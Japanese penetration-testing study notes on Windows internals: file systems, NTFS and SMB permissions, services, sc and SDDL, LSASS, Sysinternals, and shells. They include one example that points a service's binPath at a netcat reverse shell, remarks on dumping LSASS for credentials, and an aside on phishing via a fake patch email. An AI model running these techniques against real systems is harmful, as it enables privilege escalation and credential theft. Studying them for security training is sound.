# 1 Windows OSの導入

## (1) Windows 10までのバージョン番号
| オペレーティング システム名                    | バージョン番号 |
|--------------------------------|-------------|
| Windows NT4                    | 4.0         |
| Windows 2000                   | 5.0         |
| Windows XP                     | 5.1         |
| Windows Server 2003, 2003 R2    | 5.2         |
| Windows Vista, Server 2008      | 6.0         |
| Windows 7, Server 2008 R2       | 6.1         |
| Windows 8, Server 2012          | 6.2         |
| Windows 8.1, Server 2012 R2     | 6.3         |
| Windows 10, Server 2016, Server 2019 | 10.0        |

* 以下のコマンドで確認できる
> ```
> ◇ PowerShell
> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
> 
> ◇ Cmd(DOS)
> systeminfo
> ```

* Windows の多くのバージョンは現在「レガシー」とみなされ、サポートされなくなりました。組織では、重要なアプリケーションをサポートするため、または運用上や予算上の懸念から、さまざまな古いオペレーティング システムを実行していることがよくあります。評価者は、バージョン間の違いと、各バージョンに固有のさまざまな構成ミスや脆弱性を理解する必要がある。

## (2) Windowsへのリモートアクセス
最も一般的なリモート アクセス テクノロジには、次のものがありますが、これらに限定されない。

* 仮想プライベートネットワーク (VPN)???リモートアクセスなのか
* セキュア シェル (SSH) : tcp/22
* ファイル転送プロトコル (FTP) : tcp/20,21
* 仮想ネットワークコンピューティング (VNC) : tcp/5900以降
* Windows リモート管理 (または PowerShell リモート処理) (WinRM) 
> ```
> ◇ windows 7以降
> WinRM HTTP : tcp/5985 , WinRM HTTPS : tcp/5985
>
> ◇ windows 7以前
> WinRM HTTP : tcp/80 , WinRM HTTPS : tcp/443
> ```
* リモート デスクトップ プロトコル (RDP) : tcp/3389

### ① RDPによるWindowsへのアクセス
* Windows : デフォルトで搭載のRDPアプリケーションを利用
* Linux : xfreerdpを利用
> ```
> xfreerdp /v:$IP /u:$USER /p:$PASS

# 2 オペレーティングシステムのコア
## (1) Windows OSのディレクトリ構造
ルート ディレクトリは <ドライブ文字>:\ (通常は C ドライブ) だよ。

| Directory              | Function                                                                                                                 |
|------------------------|--------------------------------------------------------------------------------------------------------------------------|
| Perflogs               | Windowsのパフォーマンスログを保存することができるが、デフォルトでは空である。|
| Program Files          | 32ビットシステムでは、すべての16ビットおよび32ビットプログラムがここにインストールされる。64ビットシステムでは、64ビットプログラムのみがここにインストールされる。             |
| Program Files (x86)    | 64ビット版のWindowsでは、32ビットおよび16ビットのプログラムがここにインストールされる。|
| ProgramData            | インストールされている特定のプログラムが動作するために必要なデータを含む隠しフォルダー。このデータは、どのユーザーが実行してもプログラムからアクセス可能である。|
| Users                  | このフォルダーには、システムにログオンする各ユーザーのプロファイルが含まれており、PublicとDefaultの2つのフォルダーも含まれる。 |
| Default                | 作成されるすべてのユーザーのデフォルトのユーザープロファイルテンプレート。新しいユーザーが追加されると、そのプロファイルはDefaultプロファイルに基づく。 |
| Public                 | コンピュータユーザーがファイルを共有するためのフォルダーで、デフォルトで全ユーザーがアクセス可能。このフォルダーはネットワーク上で共有されるが、有効なネットワークアカウントが必要。|
| AppData                | 各ユーザーのアプリケーションデータと設定は、隠しユーザーサブフォルダー（例：cliff.moore\AppData）に保存される。Roamingはユーザープロファイルに依存しないデータを含み、Localはコンピュータ固有のデータでネットワークを通じて同期されない。LocalLowは、データ整合性が低い場合に使用される。    |
| Windows                | Windowsオペレーティングシステムに必要なファイルの大部分がここに保存される。|
| System, System32, SysWOW64 | Windowsのコア機能およびWindows APIに必要なすべてのDLLが含まれている。プログラムが絶対パスを指定せずにDLLをロードしようとするたびに、オペレーティングシステムはこれらのフォルダーを検索する。 |
| WinSxS                 | Windowsコンポーネントストアには、すべてのWindowsコンポーネント、更新プログラム、およびサービスパックのコピーが保存されている。|

* コマンドラインを利用してディレクトリ探索
> ```
> ◇ ディレクトリ上のすべてのファイルの一覧を表示($から始まるファイルも表示する)
> dir %DIR% /a
>
> ◇ ディレクトリ構造を枝木にして表示
> tree %DIR%
>
> もうちょっと見やすくするとこれ
> tree c:\ /f | more
> ```

## (2) ファイルシステム
Windows ファイル システムには、FAT12、FAT16、FAT32、NTFS、exFAT の 5 種類があります。FAT12 と FAT16 は、最新の Windows オペレーティング システムでは使用されなくなっているよ
### ① FAT32
FAT32 (ファイル アロケーション テーブル) は、USB メモリ スティックや SD カードなど、さまざまな種類のストレージ デバイスで広く使用されていますが、ハード ドライブのフォーマットにも使用できます。名前の「32」は、FAT32 がストレージ デバイス上のデータ クラスターを識別するために 32 ビットのデータを使用するということを示すよ。
* Pros of FAT32:
  *  デバイスの互換性 - コンピューター、デジタルカメラ、ゲーム機、スマートフォン、タブレットなどで使用できます。
  * オペレーティング システムの相互互換性 - Windows 95 以降のすべての Windows オペレーティング システムで動作し、MacOS および Linux でもサポートされているよ。
* Cons of FAT32:
  * 4GB未満のファイルでのみ使用できます。
  * データ保護機能やファイル圧縮機能は組み込まれていません。
  * ファイルの暗号化にはサードパーティのツールを使用する必要があります。
### ② NTFS
NTFS (New Technology File System) は、Windows NT 3.1 以降のデフォルトの Windows ファイル システムです。FAT32 の欠点を補うだけでなく、NTFS はメタデータのサポートが強化され、データ構造が改善されたためパフォーマンスも向上しているよ
* Pros of NTFS:
  * NTFS は信頼性が高く、システム障害や停電が発生した場合でもファイル システムの一貫性を復元できます。
  * ファイルとフォルダーの両方にきめ細かな権限を設定できるようにすることで、セキュリティを確保します。
  * 非常に大きなサイズのパーティションをサポートします。
  * ジャーナリング機能が組み込まれているため、ファイルの変更 (追加、変更、削除) がログに記録されます。
* Cons of NTFS:
  * ほとんどのモバイル デバイスは NTFS をネイティブにサポートしていません。
  * テレビやデジタル カメラなどの古いメディア デバイスでは、NTFS ストレージ デバイスはサポートされていません。

### ③ NTFSでの権限
以下のようにNTFS ファイル システムには、多くの基本権限と高度な権限がある。
| Permission Type        | Description|
|------------------------|----------------------------------------------------------------------------------------|
| Full Control           | ファイルやフォルダーの読み取り、書き込み、変更、削除を許可する。 |
| Modify                 | ファイルやフォルダーの読み取り、書き込み、削除を許可する。                 |
| List Folder Contents    | フォルダーやサブフォルダーの表示とリスト、およびファイルの実行を許可する。この権限はフォルダーにのみ継承される。|
| Read and Execute       | ファイルやサブフォルダーの表示とリスト、およびファイルの実行を許可する。ファイルとフォルダーにこの権限が継承される。|
| Write                  | フォルダーやサブフォルダーにファイルを追加し、ファイルへの書き込みを許可する。|
| Read                   | フォルダーやサブフォルダーの表示とリスト、およびファイルの内容の表示を許可する。 |
| Traverse Folder        | フォルダーを移動して他のファイルやフォルダーにアクセスする能力を許可または禁止する。例えば、c:\users\bsmith\documents\webapps\backups\backup_02042020.zip のディレクトリ内のコンテンツをリスト表示したり、ファイルを表示する権限がない場合でも、「フォルダーの移動」権限が適用されていれば、バックアップアーカイブにアクセスできる。 |


### ④ icaclsを用いたNTFSアクセス制御エントリの操作
Windows のファイルとフォルダーの NTFS アクセス許可は、セキュリティ タブのファイル エクスプローラー GUI を使用して管理できます。GUI とは別に、icacls(Integrity Control Access Control List)ユーティリティを使用してコマンド ラインから Windows の NTFS ファイル アクセス許可をきめ細かく管理することもできるよ。
* 参考サイト：https://learn.microsoft.com/ja-jp/windows-server/administration/windows-commands/icacls

* NTFSアクセス許可の表示形式
> ```
> < OBJECT(Group,Service,User) >:< リソースアクセスレベルや基本的なアクセス権限 >
> ```

* 例 1：icaclsによるNTFSアクセス制御エントリの設定を表示
> ```
> C:\htb> icacls c:\windows
> c:\windows NT SERVICE\TrustedInstaller:(F)
>            NT SERVICE\TrustedInstaller:(CI)(IO)(F)
>            NT AUTHORITY\SYSTEM:(M)
>            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
>            BUILTIN\Administrators:(M)
>            BUILTIN\Administrators:(OI)(CI)(IO)(F)
>            BUILTIN\Users:(RX)
>            BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
>            CREATOR OWNER:(OI)(CI)(IO)(F)
>            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
>            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
>            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
>            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
> 
> Successfully processed 1 files; Failed processing 0 files
> ```
各グループ、サービス、ユーザごとに権限を割り当てているのが分かる

* 例 2：icaclsによるjoeユーザへの`C:\Users`へのディレクトリに関するフルアクセス権の付与
> ```
> icacls c:\users /grant joe:f
> ```

* 例 3：joeユーザへの`C:\Users`へのディレクトリに関するアクセス権の取り消し
> ```
> icacls c:\users /remove joe
> ```
#### リソースアクセスレベルの設定の表示
* (CI): コンテナ継承 - フォルダ内のフォルダにもそのアクセス制御エントリが適用されるよ
* (OI): オブジェクト継承 - フォルダ内のファイルにもそのアクセス制御エントリが適用されるよ
* (IO): 継承のみ - 親コンテナーから現コンテナーは、アクセス制御エントリを継承する
* (NP): 継承を伝播しない - 上から継承されるはずのアクセス制御エントリを適用しない
* (I): 親コンテナから継承された権限 - 親コンテナから継承されたアクセス制御エントリを自分の配下のコンテナに適用しない。

##### 用語説明
* コンテナ：オブジェクトとかコンテナを入れられるものだよ。フォルダとして考えたらいいと思う
* オブジェクト：ファイルやプロセス、リソース、ユーザのことだよ。今回は、ファイルとして考えたらわかりやすいよ。

#### 基本的なアクセス権限の表示
* F : フルアクセス
* D : 削除アクセス
* N : アクセス不可
* M : アクセスの変更
* RX : 読み取りおよび実行アクセス
* R : 読み取り専用アクセス
* W: 書き込み専用アクセス

## (3) NTFSと共有アクセス許可
* Server Message Block protocol(SMB) - Windows でファイルやプリンターなどの共有リソースを接続するために使用される。
* 使用ポート：tcp/445(SMB),tcp/137~139(NetBIOS)
* Windows 用に作成されたマルウェアの多くの亜種は、緩いアクセス許可が適用されたネットワーク共有を介してネットワーク上に拡散する可能性がある。また、パッチが適用されていないWindowsシステムのSMBv1に対するEternalBlue脆弱性を突いた攻撃とかもある。

* 大規模、中規模、小規模のエンタープライズ環境で使用される。以下は、簡単にしたSMBによるリソース共有の図
![image](https://github.com/user-attachments/assets/8c47bc59-2780-4465-ad69-60038fcbe761)

### ① 共有権限とNTFS 基本権限
NTFS アクセス許可と共有アクセス許可は、多くの場合同じものと理解されています。これらは同じではありませんが、多くの場合、同じ共有リソースに適用されることに注意。
* 共有権限
| 許可          | 説明                                                                                               |
|---------------|----------------------------------------------------------------------------------------------------|
| Full Control  | ユーザーは、変更および読み取り権限によって与えられたすべてのアクションを実行でき、NTFSファイルとサブフォルダの権限も変更できる。 |
| Change        | ユーザーはファイルとサブフォルダの読み取り、編集、削除、追加を行うことができる。                             |
| Read          | ユーザーはファイルとサブフォルダの内容を閲覧できる。                                                   |
* NTFS基本権限
| 許可                  | 説明|
|-----------------------|--------------------------------------------------------------------------------------------|
| Full Control          | ユーザーは、ファイルとフォルダを追加、編集、移動、削除できるほか、許可されたすべてのフォルダに適用されるNTFS権限を変更することもできる。 |
| Modify             | ユーザーはファイルやフォルダの表示や変更の権限を許可または拒否され、これにはファイルの追加や削除が含まれる。|
| Read & Execute        | ユーザーはファイルの内容の読み取りとプログラムの実行を許可または拒否される。|
| List folder contents   | ユーザーはファイルとサブフォルダの一覧を表示する権限を許可または拒否される。|
| Read                  | ユーザーはファイルの内容を読み取る権限を許可または拒否される。                           |
| Write       | ユーザーには、ファイルへの変更の書き込みとフォルダへの新しいファイルの追加が許可されるか、拒否されるかが決定される。|
| Special Permissions    | さまざまな高度な権限オプションを提供する。                        |
* NTFS の特別なアクセス許可

#### 注意すべき点
* NTFS アクセス許可は、フォルダーとファイルが**ホストされているシステムに適用**される
```
マシンにローカルにログインしているか、RDP 経由でログインしているユーザーは、ファイル システム上の場所に移動するだけで共有フォルダーとファイルにアクセスでき、NTFS アクセス許可のみを考慮する必要
```
* 共有アクセス許可は、フォルダーが** SMB 経由でアクセス**されている場合 (通常はネットワーク上の別のシステムから) に適用

### ② ネットワーク共有の作成
1. フォルダ作成
2. フォルダを右クリックして、「プロパティ」(Proparty)を開いて「共有」(Share)タブを選択し、「詳細な共有」(Advanced Sharing)から設定

![image](https://github.com/user-attachments/assets/17ed554c-e034-410a-bca9-b03684d8e71a)

3. フォルダの「このフォルダーを共有にする」(Share this folder) にチェックし、共有名、任意の人数制限、任意のコメントを設定し、「アクセス許可」(Premissions)を選択する。
![image](https://github.com/user-attachments/assets/b8281a9f-e7b2-499f-a3ed-dcdddb511114)

4. アクセスするユーザやグループのアクセス権を設定し、ok
![image](https://github.com/user-attachments/assets/8a82f8fb-60d0-4986-b03c-a7b63028e967)

### ③ Windows Defender ファイアーウォールによるデフォルトのsmb共有のブロック
* Workgroupの場合(ドメインに参加していないWindows) : 同じWorkgroupに参加していないデバイスからのアクセスは、許可されない。
> あと関係ないけどWorkgroupが同じだったら「SAMデータベース」(LocalのPCにある認証機構)で認証する
* Windowsドメインに参加している場合 : netlogon要求は、AD(Active Direcctory)にやって行われる。ADが許可出せばブロックされない。
### ④ smb共有へのアクセス
* LinuxによるSmb共有へアクセス,共有のマウント
> ```
> ◇ 利用可能な共有を一覧表示
> smbclient -L -U $USER \\$IP (ユーザ認証あり)
> smbclient -N -L \\$IP       (ユーザ認証無し(everyoneを利用))
>
> ◇ 共有へのアクセス
> smbclient -U $user \\$IP\$share  (ユーザ認証あり)
> smbclient -N \\$IP\$share        (ユーザ認証無し(everyoneを利用))
>
> ◇ CIFSユーティリティのインストール
> sudo apt-get install cifs-utils
> 
> ◇ 共有をマウント
> sudo mount -t cifs -o username=$user,password=$pass //$IP/$share $mount-full-path
> ```

* Windowsによるsmb共有へのアクセス、共有マウント
  * エクスプローラーから行く方法(パスをやるところに「\\ホスト名orIP\共有名」で検索かける」)
  ![image](https://github.com/user-attachments/assets/78bd4116-8412-40cf-a9da-256c90d2b7e3)
  * 「Win + R」でファイル名を指定して実行で「\\ホスト名orIP\共有名」を入力
  * コマンドプロンプト(DOS,PowerShell)だと、「\\ホスト名orIP\共有名」に対して、共有されていればファイル操作のコマンドが利用できる
  > ```
  > 例：dir \\%host%\%share%,copy \\%host%\%share%\%file% .\%file-name%
  > ```
  * 「net use」コマンドを利用して共有をマウントしてしよう(自分のログインユーザがアクセス権を持たないときに別のユーザの認証を利用してアクセスできる)
  > ```
  > net use \\%host%\%share% /user:%user% %pass%
  > 以下マウントした共有(\\%host%\%share%)に操作できる
  > ```

### ④ Windowsによるsmb共有の把握、監視
* 「net share」を利用した自分の共有の把握(攻撃のときに、Windowsのマシンに侵入できたら確認したいね)
> ```
> net share
> ```
* 「コンピュータ管理」(Computer Management)から共有を監視
![image](https://github.com/user-attachments/assets/4c8fc318-75e4-4372-8897-8d46ac9d4ad4)
* イベント ビューアーで監視(攻撃者は、マルウェアや攻撃ツールを配送したり、配布するために共有を作るかもな)
* 「net view」を使用した他のコンピュータの共有フォルダの探索(攻撃のときに、Windowsのマシンに侵入できたら、ためしたいね)
> ```
> net view \\%host%
> 共有されているフォルダのリストが表示されるよ
> ```

# 3 サービスとプロセスの操作
## (1) Windowsサービスとプロセス
サービスは、Windows オペレーティング システムの主要コンポーネントです。これにより、長時間実行されるプロセスの作成と管理が可能になります。Windows サービスは、ユーザーの介入なしに、システムの起動時に自動的に開始できます。これらのサービスは、ユーザーがシステムのアカウントからログアウトした後でも、バックグラウンドで実行し続けることができる。

### ① Windowsサービス
ネットワーク機能、システム診断の実行、ユーザー資格情報の管理、Windows 更新プログラムの制御など、Windows オペレーティング システム内の多くの機能を担当している。
* Windowsサービスは、services.msc(MMCアドイン)でアクセスできるサービス・コントロール・マネージャー（SCM）システムで管理される。
* 稼働しているサービスの確認(powershell)
> ```
> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
> ```
* サービスの状態は、実行中、停止、一時停止として表示され、手動、自動、また​​はシステム起動時に遅延して開始するよう設定できる
* 通常、サービスを作成、変更、削除できるのは、管理者権限を持つユーザーのみです。サービス権限に関する構成ミスは、Windows システムでよくある権限昇格の原因

#### Windowsサービス一覧
Windows には、システムを再起動せずに停止および再開できない重要なシステム サービスがいくつかあります。これらのサービスのいずれかで使用中のファイルまたはリソースを更新する場合は、システムを再起動する必要がある
| Service              | Description|
|----------------------|-----------------------------------------------------------------------------------------------|
| smss.exe             | セッション マネージャー サブシステム。システム上のセッションを処理します。|
| csrss.exe            | クライアント サーバー ランタイム プロセス。Windows サブシステムのユーザーモード部分です。|
| wininit.exe          | プログラムをインストールした後、コンピュータを再起動するときに Windows に加える変更をリストする .ini ファイルを開始します|
| logonui.exe          | PC へのユーザー ログインを促進するために使用されます。|
| lsass.exe            | ローカルセキュリティ認証サービスは、PC またはサーバーへのユーザーログオンの有効性を確認します。Winlogon サービスのユーザ認証を担当するプロセスを生成します。 |
| services.exe         | サービスの開始と停止を管理します。                                                             |
| winlogon.exe         | セキュリティ注意シーケンスの処理、ログオン時のユーザー プロファイルの読み込み、およびスクリーンセーバー実行中のコンピュータのロックを担当します。 |
| System               | Windows カーネルを実行するバックグラウンド システム プロセスです。|
| svchost.exe with RPCSS | ダイナミックリンクライブラリ (.dll ファイル) から実行されるシステムサービス（「自動更新」、「Windows ファイアウォール」、「プラグ アンド プレイ」など）を管理します。リモート プロシージャ コール (RPC) サービス (RPCSS) を使用します。 |
| svchost.exe with Dcom/PnP | ダイナミックリンクライブラリ (.dll ファイル) から実行されるシステムサービス（「自動更新」、「Windows ファイアウォール」、「プラグ アンド プレイ」など）を管理します。分散コンポーネント オブジェクト モデル (DCOM) およびプラグ アンド プレイ (PnP) サービスを使用します。 |

### ② プロセス
* Windows システム上でバックグラウンドで実行されます。プロセスは、Windows オペレーティング システムの一部として自動的に実行されるか、インストールされている他のアプリケーションによって開始される。
* 一部プロセスが必要で、終了するとOSの特定の部品が動かなくなるよ
  * Windows Logon Application
  * System, System Idle Process,
  * Windows Start-Up Application, Client Server Runtime,
  * Windows Session Manager, Service Host,
  * Local Security Authority Subsystem Service (LSASS) process.

### ③ Local Security Subsystem service(LSASS)
Windows システムのセキュリティ ポリシーの適用を担当するプロセス
* このプロセスはログオン試行を確認し、ユーザーのアクセス許可レベルに基づいてアクセストークン(アクセス用の権限が書かれた券似たいなもの)を作成するよ
* ユーザー アカウントのパスワード変更も担当!!
* このプロセスに関連するすべてのイベント (ログオン/ログオフ試行など) は、Windows セキュリティ ログに記録されるよ。
* こいつは、メモリにクリアテキストとハッシュされた資格情報なども保存していて、mimikatzとかrubeusでメモリダンプを解析すると色々取れるよ。

### ④ Sysinternalsツール
* Windows システムの管理に使用できるポータブル Windows アプリケーションのセット(Windows公式なんだ)
* tool URL ： https://download.sysinternals.com/files/SysinternalsSuite.zip
* smb共有 ： `\\live.sysinternals.com\tools\`
* Microsoft ： https://docs.microsoft.com/en-us/sysinternals
* 利用方法：
> ```
> ◇ 直接Sysinternalsツールをダウンロードして実行する。
> URL : https://download.sysinternals.com/files/SysinternalsSuite.zip
> wget https://download.sysinternals.com/files/SysinternalsSuite.zip
> tar -xf SysinternalsSuite.zip
> 
> ◇ SMB共有からの実行
> パス : \\live.sysinternals.com\tools\          (ここにツールが入ってる)
> \\live.sysinternals.com\tools\procdump.exe -accepteula
>
> ※デフォルトの設定だと、Windows DefenderファイアーウォールでPublicなネットワークでのSMB共有の機能(ネットワーク共有、ネットワーク探索)が無効化されているのでSMB共有から実行する際は注意しよう
> ```
* Sysinternals Toolsで使えるやつ(個人的に)
  * Process Explorer - フォレンジック、マルウェアの動的解析に使える(ファイル操作の監視)
  * Process Monitor  - フォレンジック、マルウェアの動的解析に使える(プロセス操作の監視)
  * procdump.exe - lsassのメモリをダンプし、mimikatz等で解析して、資格情報やチケットをとれる
  * psexec - SMBでリモートから資格情報等を利用して、コマンドやプロセスを実行できる(横展開、縦展開に使える)

### ⑤ タスクマネージャー
* 行中のプロセス、システム パフォーマンス、実行中のサービス、スタートアップ プログラム、ログインしているユーザー/ログインしているユーザーのプロセス、およびサービスに関する情報を提供
* 「Ctrl + Shift + Esc キー」で開けるよ

### Process Explorer
Sysinternals toolsスイートのツールだよ。詳細は省くけど、DLLの結びつきや親子プロセスの関係を分析しやすくて、マルウェア解析とかに使えるし、孤立したプロセスとかの問題のトラブルシューティングに役立てられるよ。

## (2) サービス権限
### ① Windowsサービスの問題
* サービスは長時間実行されるプロセスを管理できるものであり、Windows オペレーティング システムの重要な部分!!!!
* Windows サービスにおけるこれらの脅威ベクトルは、サードパーティソフトウェアによって導入されたサービス権限の誤った構成や、インストール プロセス中に管理者が犯しやすいミスによって発生することがよくある。
*  DHCP や Active Directory ドメイン サービスなどの重要なネットワーク サービスのインストールには、実行する管理者に割り当てられたアカウントを使用してインストールする。これを個人で管理者の権限持つアカウントでやると、そいつが解雇や退職になったときアカウントを消すと、サービスに不具合や停止が起こる。だから、サービスごとの個別アカウントであるサービスアカウントを作る必要がある。
### ② サービスの権限
* services.mscでサービスを調べることができる
* ほとんどのサービスは、既定で LocalSystem権限(LocalのWindowsで最高レベルのアクセス)で実行される
> すべてのアプリケーションがLocalSystemアカウントレベルのアクセス許可を必要とするわけではない
* なんでもそうだけど、権限は最小権限の原則に基づいてやろうね
> https://www.cloudflare.com/learning/access-management/principle-of-least-privilege/
* デフォルトであるビルトインのサービスアカウント
  * LocalService
  * NetworkService
  * LocalSystem

#### services.mscによるサービスの操作
* 全般(General)タブ - そのサービスの説明、開始や停止などの操作や開始パラメータの指定ができる
* ログオン(Log On)タブ - なんのユーザでログオンさせて実行させるかを操作、参照できる。
* 回復(Recovery)タブ - サービスの起動に失敗した際に、どのような処理をするかが設定できる。
![image](https://github.com/user-attachments/assets/649a2d6c-6a9c-488d-8803-eada7227edc2)
こいつは、攻撃者が正当なサービスを利用して悪意のあるプログラムを実行するために使用できるベクトルになる

#### scコマンドを使用したサービスの操作
* サービスの参照(sc qc) - サービスの状況、サービスの設定等が分かる。
> ```
> sc qc %service-name%
> sc qc //%hostname-or-ip% %service-name%   (リモートデバイス上のサービスを照会するとき)
> ```

* サービスの設定の変更(sc config)
> ```
> ◇ サービスの実行ファイルパス設定を変更 
> sc config %service-name% binPath=%exe-param%
> ※binPathには、実行可能ファイルを指定するだけでなく、その実行ファイルへの引数を含めて指定できる
> 例： sc config wuauserv binPath="C:\Windows\nc.exe -e cmd.exe 192.168.1.1"
>
> このように悪用すれば、system権限に昇格したり、サービスにバックドアとかマルウェアとかのプロセスを偽装することができる。
> ```

* サービスの停止、実行(sc stop,sc start)
> ```
> sc stop %service-name%
> sc start %service-name%
> ```
* サービスの権限の確認(sc sdshow) SDDL形式で表示される
> ```
> sc sdshow wuauserv
> D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOSDRCWDWO;;;WD)
> ```
#### 表示形式(SDDL)
* 形式：ACLタイプ:(ACEタイプ;継承フラグ;アクセスマスク;オブジェクトGUID;継承オブジェクトGUID;SID)...

| フィールド       | 説明                                                             |
|------------------|------------------------------------------------------------------|
| 0. ACLタイプ     | `D` = DACL、`S` = SACL                                            |
| 1. ACEタイプ       | `A` = 許可、`D` = 拒否                                           |
| 2. 継承フラグ      | オブジェクトの継承設定（親からの継承など）                         |
| 3. アクセスマスク   | 許可または拒否するアクセス権（`CC`, `RP`, `WP`など）             |
| 4. オブジェクトGUID | 特定のオブジェクトタイプに対するアクセス制御（通常空で`;;`）      |
| 5. 継承オブジェクトGUID | 継承時に特定のオブジェクトタイプに適用（通常空で`;;`）          |
| 6. SID             | アクセス権を持つユーザーやグループ（`SY`, `BA`, `AU`など）         |
> だから大体は、「ACLタイプ:(ACEタイプ;;アクセスマスク;;;)」

* アクセスマスク(アクセス許可の種類)の種類

| アクセスマスク | 説明                                                      |
|----------------|-----------------------------------------------------------|
| CC             | サービス構成のクエリ（Query Configuration）                |
| DC             | サービス構成の変更（Change Configuration）                 |
| LC             | サービスの一覧表示（List Service）                         |
| SW             | サービスのステータスを照会（Query Status）                 |
| RP             | サービスの開始/停止（Start/Stop Service）                  |
| WP             | サービス構成の書き込み（Write Configuration）              |
| DT             | サービスの削除（Delete Service）                           |
| LO             | サービスのロック（Lock Service）                           |
| CR             | サービスの作成（Create Service）                           |
| RC             | 読み取り（Read Control）                                   |
| WD             | 書き込み（Write DAC - Discretionary Access Control）        |
| WO             | 所有者の書き換え（Write Owner）                            |
| SD             | サービスのセキュリティ記述子の変更（Modify Security Descriptor） |

* SIDの種類

| SID    | 説明                                                      |
|--------|-----------------------------------------------------------|
| SY     | SYSTEMアカウント                                           |
| BA     | BUILTIN\Administrators（管理者グループ）                   |
| AU     | Authenticated Users（認証されたユーザー）                   |
| BU     | BUILTIN\Users（ユーザーグループ）                          |
| WD     | Everyone（すべてのユーザー）                               |
| LA     | Local Administrator（ローカル管理者）                      |
| LG     | Local Guest（ローカルゲスト）                              |
| NU     | Network User（ネットワークユーザー）                       |
| DA     | Domain Admins（ドメイン管理者）                            |
| DU     | Domain Users（ドメインユーザー）                           |
| DG     | Domain Guests（ドメインゲスト）                            |
| AO     | Account Operators（アカウントオペレーター）                |
| PO     | Printer Operators（プリンターオペレーター）                |
| SO     | Server Operators（サーバーオペレーター）                   |
| IU     | Interactive Users（対話的にログオンしたユーザー）           |
| SU     | Service Logon（サービスとしてログオンしたユーザー）         |
| CO     | Creator Owner（作成者/所有者）                             |
| BO     | Backup Operators（バックアップオペレーター）                |
| RE     | Replicator（レプリケーター）                               |
| AN     | Anonymous（匿名ログオン）                                  |

> ※ユーザが作ったユーザだとこのような省略はされない。普通のSIDの表記になる(`S-1-5-<ドメイン識別子>-<RID>`)

#### PowerShellによるサービス権限の確認
PowerShell コマンドレットを使用するとGet-Acl、レジストリ内の特定のサービスのパスをターゲットにして、サービスのアクセス許可を調べられる。
* 基本的に現在のシステムで使ってるサービスが登録されているレジストリ
> ```
> HKLM:\System\CurrentControlSet\Services\配下
> ```
* PowerShellによるサービスの権限の確認
> ```
> Get-ACL -Path %legistory-key-path% | Format-list
> 例：
> Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
> ```

## --全く関係ない話--
セキュリティパッチとかを配布して、ユーザに実行させて対処しているような組織だと。セキュリティパッチとかを配布している部門になりすますことによって、メールとかでパッチを流して管理者権限で実行させるように促せば、結構簡単に初期侵入できてしまうのではないかな。

# 4 Windowsとの対話
## (1) Windows セッション
### ① 対話型、ローカルログオンセッションの開始
ユーザーが資格情報を入力してローカル システムまたはドメイン システムに認証することで開始できるよ。
* システムに直接ログオン --- ログオンタイプ 2：対話型
* 「runas」を使用して2番目のセッションを要求
  * 通常  --- ログオンタイプ 2 : 対話型
  * 別のユーザーアカウントでリモートシステムにアクセスする場合、資格情報を指定して実行する場合 --- ログオンタイプ 9 : 新しい資格情報
  * リモートでrunasを使ってアクセスされた側のPCの場合 --- ログオンタイプ 3：ネットワーク
* リモートデスクトップ接続 --- ログオンタイプ 10 : リモートインタラクティブ
* PsExecによる接続
  * 通常 --- ログオンタイプ 3：ネットワーク
  * サービスを使用してコマンドを実行するとき --- ログオンタイプ 5：サービス
まだまだいろいろあるよ

### ② 非対話型アカウント
| Account                  | Description                                                                        |
|--------------------------|------------------------------------------------------------------------------------|
| Local System Account      | NT AUTHORITY\SYSTEM アカウントとも呼ばれ、Windows システムで最も強力なアカウントです。Windows サービスの開始など、さまざまな OS 関連のタスクに使用されます。このアカウントは、ローカル管理者グループのアカウントよりも強力です。 |
| Local Service Account     | NT AUTHORITY\LocalService アカウントとも呼ばれ、SYSTEM アカウントの特権が少ないバージョンであり、ローカル ユーザー アカウントと同様の特権を持っています。制限された機能が付与され、いくつかのサービスを開始できます。 |
| Network Service Account   | NT AUTHORITY\NetworkService アカウントとして知られ、標準のドメイン ユーザー アカウントに似ています。ローカル マシン上のローカル サービス アカウントと同様の特権を持っています。特定のネットワーク サービスのために認証されたセッションを確立できます|

## (2) Windows OSとの対話
### ① RDP
* port : tcp/3389
* リモートPCのデスクトップにアクセスできちゃうよ。
* 最近だと、VPNを接続した後にRDP接続して、リモートワークする形式が増えてるよ ⇒ VPNに侵入できれば、RDP等に攻撃できるかも

### ② Windowsコマンドライン
#### CMD(MS-DOS シェル)
* コマンド プロンプト (cmd.exe) は、コマンドを入力して実行するために使用される。
* CMD はセッション中に使用されたコマンドの記録を保持しない ⇒　痕跡が残るのを回避できる
* 実行ポリシーの影響を受けない(UAC等) - コマンドとかスクリプトの実行がPowerShellより妨害されない
* パッチを実行できる。
* 古いやつにもある
* コマンドの使い方を調べる方法
> ```
> help %command%
> %command% /?
> ```

#### PowerShell
Windows PowerShell は、Microsoft がシステム管理者向けに設計したコマンド シェル。
* .NET Framework上に構築されており、コマンド実行のログは残る
* スクリプトやコマンド、ファイルの実行は、実行ポリシーの影響を受ける
* コマンドは、コマンドレットと呼ばれ、「動作-名詞」の形式になってる
* エイリアス、コマンドレットは形式が長くなるから、多くのエイリアス(別名)がコマンドには付けられてる。
> ```
> ◇ エイリアスを調べる
> get-alias
>
> ◇ エイリアスの作成
> new-alias -name "%alias-name%" %cmd%
>
> ◇ エイリアスの名前から検索
> get-alias -name "%alias-name%"
> ```

#### 実行ポリシー
場合によっては、システム上でスクリプトを実行できないことがあります。これは、悪意のあるスクリプトの実行を阻止しようとする実行ポリシーと呼ばれるセキュリティ機能のせいだよ。
* 実行ポリシー

| 実行ポリシー   | 説明                                                                                                                      | リスク/注意点                                                                                         |
|----------------|---------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------|
